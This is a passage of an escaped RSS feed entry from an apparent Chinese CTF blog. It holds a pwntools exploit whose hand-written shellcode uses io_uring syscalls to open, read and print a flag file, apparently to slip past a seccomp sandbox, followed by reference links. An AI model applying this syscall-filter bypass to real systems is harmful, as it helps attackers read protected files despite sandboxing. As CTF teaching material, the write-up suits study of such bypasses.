1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;liburing&lt;/code&gt;提供了对底层系统调用的封装，但是看了看，还是觉得直接用系统调用写shellcode比较简单，这里直接用模板&lt;/p&gt;&#xA;&lt;p&gt;exp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # pause()&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;p = process(address)&#xA;&#xA;elf = ELF(address)&#xA;libc = elf.libc&#xA;&#xA;# ip = &amp;#34;&amp;#34;&#xA;# port = &#xA;#p = remote(ip,port)&#xA;&#xA;shellcode = asm(&amp;#34;&amp;#34;&amp;#34;&#xA;/*视情况调整栈帧*/&#xA;    add rsp, 0x2000&#xA;/*int uring_fd = syscall(SYS_io_uring_setup, 16, &amp;amp;params);*/&#xA;    mov rax, 0&#xA;    lea rdi, [rsp&amp;#43;0x100]&#xA;    mov rcx, 15&#xA;    rep stosq&#xA;    mov rdi, 16&#xA;    lea rsi, [rsp&amp;#43;0x100]&#xA;    mov rax, 0x1a9&#xA;    syscall&#xA;/*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/&#xA;    mov qword ptr [rsp&amp;#43;0x200], rax&#xA;    xor rdi, rdi&#xA;    mov rsi, 0x1000&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    mov r8, qword ptr [rsp&amp;#43;0x200]&#xA;    mov r9, 0&#xA;    mov rax, 9&#xA;    syscall&#xA;    mov qword ptr [rsp&amp;#43;0x208], rax&#xA;/*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/&#xA;    xor rdi, rdi&#xA;    mov rsi, 0x1000&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    mov r8, qword ptr [rsp&amp;#43;0x200]&#xA;    mov r9, 0x8000000&#xA;    mov rax, 9&#xA;    syscall&#xA;    mov qword ptr [rsp&amp;#43;0x210], rax&#xA;/*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/&#xA;    xor rdi, rdi&#xA;    mov rsi, 0x1000&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    mov r8, qword ptr [rsp&amp;#43;0x200]&#xA;    mov r9, 0x10000000&#xA;    mov rax, 9&#xA;    syscall&#xA;    mov qword ptr [rsp&amp;#43;0x218], rax&#xA;&#xA;/*openat*/&#xA;    mov rax, 0&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov rcx, 8&#xA;    rep stosq&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov byte ptr [rdi], 18 &#x9;/*opcode*/&#xA;    mov byte ptr [rdi&amp;#43;1], 0&#x9;/* IOSQE_ flags*/&#xA;    mov dword ptr [rdi&amp;#43;4], -100&#x9;/* file descriptor to do IO on */&#xA;    /* 要打开文件的路径存放在 rsp&amp;#43;0x300 处 */&#xA;    mov rax, 0x67616c662f2e&#xA;    mov qword ptr [rsp&amp;#43;0x300], rax&#xA;    lea rax, [rsp&amp;#43;0x300]&#xA;    mov qword ptr [rdi&amp;#43;16], rax /*pathname*/&#xA;    mov dword ptr [rdi&amp;#43;28], 0&#x9;/*open_flag*/&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x140]&#xA;    add rdi, rdx&#xA;    mov dword ptr [rdi], 0&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x12c]&#xA;    add rdi, rdx&#xA;    add dword ptr [rdi], 1&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x200]&#xA;    mov rsi, 1&#xA;    mov rdx, 1&#xA;    mov r10, 1&#xA;    xor r8, r8&#xA;    xor r9, r9&#xA;    mov rax, 0x1aa&#xA;    syscall&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x210]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x164]&#xA;    add rdi, rdx&#xA;    mov edx, dword ptr [rdi&amp;#43;8]&#xA;    mov qword ptr [rsp&amp;#43;0x220], rdx&#xA;&#xA; /*read*/&#xA;    mov rax, 0&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov rcx, 8&#xA;    rep stosq&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov byte ptr [rdi], 22&#xA;    mov rax, qword ptr [rsp&amp;#43;0x220]&#xA;    mov dword ptr [rdi&amp;#43;4], eax&#xA;    lea rax, [rsp&amp;#43;0x300]&#xA;    mov qword ptr [rdi&amp;#43;16], rax&#xA;    mov dword ptr [rdi&amp;#43;24], 0x100&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x140]&#xA;    add rdi, rdx&#xA;    mov dword ptr [rdi], 0&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x12c]&#xA;    add rdi, rdx&#xA;    add dword ptr [rdi], 1&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x200]&#xA;    mov rsi, 1&#xA;    mov rdx, 1&#xA;    mov r10, 1&#xA;    xor r8, r8&#xA;    xor r9, r9&#xA;    mov rax, 0x1aa&#xA;    syscall&#xA;&#xA;/*write*/&#xA;    mov rax, 0&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov rcx, 8&#xA;    rep stosq&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x218]&#xA;    mov byte ptr [rdi], 23&#xA;    mov dword ptr [rdi&amp;#43;4], 1&#xA;    lea rax, [rsp&amp;#43;0x300]&#xA;    mov qword ptr [rdi&amp;#43;16], rax&#xA;    mov dword ptr [rdi&amp;#43;24], 0x100&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x140]&#xA;    add rdi, rdx&#xA;    mov dword ptr [rdi], 0&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x208]&#xA;    mov edx, dword ptr [rsp&amp;#43;0x12c]&#xA;    add rdi, rdx&#xA;    add dword ptr [rdi], 1&#xA;&#xA;    mov rdi, qword ptr [rsp&amp;#43;0x200]&#xA;    mov rsi, 1&#xA;    mov rdx, 3&#xA;    mov r10, 1&#xA;    xor r8, r8&#xA;    xor r9, r9&#xA;    mov rax, 0x1aa&#xA;    syscall&#xA;&amp;#34;&amp;#34;&amp;#34;)&#xA;&#xA;p.recvuntil(b&amp;#39;code\n&amp;#39;)&#xA;# dbg()&#xA;p.send(shellcode)&#xA;&#xA;&#xA;p.interactive()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可能要多打几次才能打通&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;参考文章&#34;&gt;&lt;span&gt;参考文章&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://www.yuque.com/xiaocangxu/pwn/pd2zc37ebgbanvau#vqGHAs&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.yuque.com/xiaocangxu/pwn/pd2zc37ebgbanvau#vqGHAs&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://kernel.dk/io_uring.pdf&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://kernel.dk/io_uring.pdf&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://arthurchiao.art/blog/intro-to-io-uring-zh/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;[译] Linux 异步 I/O 框架 io_uring：基本原理、程序示例与性能压测（2020）&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://blog.xmcve.com/2023/10/31/ACTF-2023-Writeup/#title-9&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;星盟WP&lt;/a&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
